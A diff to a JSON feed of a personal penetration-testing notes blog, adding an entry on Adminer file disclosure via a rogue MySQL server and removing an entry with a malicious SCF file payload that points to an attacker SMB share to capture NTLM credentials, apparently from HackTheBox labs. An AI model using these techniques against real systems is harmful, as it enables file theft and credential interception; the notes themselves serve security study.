@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
+            "title": "Adminer File Disclosure",
+            "summary": "Adminer File Disclosure",
+            "content_text": "OverviewAttacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.Protocol Flaw in MySQL  The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)Steps  Update rogue_mysql_server.py with the file you want to read and run itcd ~/data/toolscat rogue_mysql_server.py | egrep 'filename ='python2 rogue_mysql_server.py  Open wireshark and filter mysql packets  Login to adminer and point it to attacker rogue mysql. The rest can be any value.  Go back to wire shark and check the mysql response from victim.References  PHP tool ‘Adminer’ leaks passwords – Sansec  Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit  Alternative to the above - much easier to use",
+            "content_html": "<h1 id=\"overview\">Overview</h1><p>Attacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.</p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EF3B2DBA-F55A-487A-A698-BB47C683143C.png\" alt=\"\" /></p><h1 id=\"protocol-flaw-in-mysql\">Protocol Flaw in MySQL</h1><blockquote>  <p>The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)</p></blockquote><h1 id=\"steps\">Steps</h1><ul>  <li>Update <code class=\"language-plaintext highlighter-rouge\">rogue_mysql_server.py</code> with the file you want to read and run it</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> ~/data/tools<span class=\"nb\">cat </span>rogue_mysql_server.py | egrep <span class=\"s1\">'filename ='</span>python2 rogue_mysql_server.py</code></pre></div></div><ul>  <li>Open wireshark and filter mysql packets</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EA76910F-225D-4CD4-AA58-A0B7B73F1FFC.png\" alt=\"\" /></p><ul>  <li>Login to adminer and point it to attacker rogue mysql. The rest can be any value.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/2C2CD67E-0CD7-40AC-B898-E61DEF389D83.png\" alt=\"\" /></p><ul>  <li>Go back to wire shark and check the mysql response from victim.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0EE58AEE-B02F-4189-8DCF-96A72324C37B.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0B1373DE-095F-440A-ACBF-62BC821E42DC.png\" alt=\"\" /></p><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability\">PHP tool ‘Adminer’ leaks passwords – Sansec</a></li>  <li><a href=\"https://www.exploit-db.com/exploits/43593\">Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit</a></li>  <li><a href=\"https://podalirius.net/en/cves/2021-xxxxx/\">Alternative to the above</a> - much easier to use</li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
+            
+            
+            
+            "tags": ["lfi","enum","foothold"],
+            
+            "date_published": "2022-04-08T00:00:00+08:00",
+            "date_modified": "2022-04-08T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/04/07/hashes",
             "title": "Hashes",
             "summary": "Hashes",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-01-24T00:00:00+08:00",
             "date_modified": "2022-01-24T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload",
-            "title": "Malicious SCF File Upload",
-            "summary": "Malicious SCF File Upload",
-            "content_text": "OverviewAttacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.One example to access SCF file is via explorer.exe.%SystemRoot%\\explorer.exe \"C:\\Users\\victim\\desktop\"Environment Setup  Webapp that allows file upload  Some background script inside victim that access the uploaded filesSteps  Open responder on attacker machinesudo responder -I tun0  Create a malicious SCF file and name it as @evil.scf. Put the path to attacker share.[Shell]Command=2IconFile=\\\\10.10.14.13\\share\\icon.ico[Taskbar]Command=ToggleDesktop  Upload the file and wait for someone to access  You should be able to intercept NTLM credsReference  HTB Driver  SMB Share – SCF File Attacks – Penetration Testing Lab",
-            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.</p><p>One example to access SCF file is via <code class=\"language-plaintext highlighter-rouge\">explorer.exe</code>.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>%SystemRoot%\\explorer.exe \"C:\\Users\\victim\\desktop\"</code></pre></div></div><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Webapp that allows file upload</li>  <li>Some background script inside victim that access the uploaded files</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Open responder on attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>responder <span class=\"nt\">-I</span> tun0</code></pre></div></div><ul>  <li>Create a malicious SCF file and name it as <code class=\"language-plaintext highlighter-rouge\">@evil.scf</code>. Put the path to attacker share.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[Shell]Command=2IconFile=\\\\10.10.14.13\\share\\icon.ico[Taskbar]Command=ToggleDesktop</code></pre></div></div><ul>  <li>Upload the file and wait for someone to access</li>  <li>You should be able to intercept NTLM creds</li></ul><h2 id=\"reference\">Reference</h2><ul>  <li>HTB Driver</li>  <li><a href=\"https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/\">SMB Share – SCF File Attacks – Penetration Testing Lab</a></li></ul>",
-            "url": "https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload",
-            
-            
-            
-            "tags": ["windows","rce","foothold","smb"],
-            
-            "date_published": "2022-01-23T00:00:00+08:00",
-            "date_modified": "2022-01-23T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
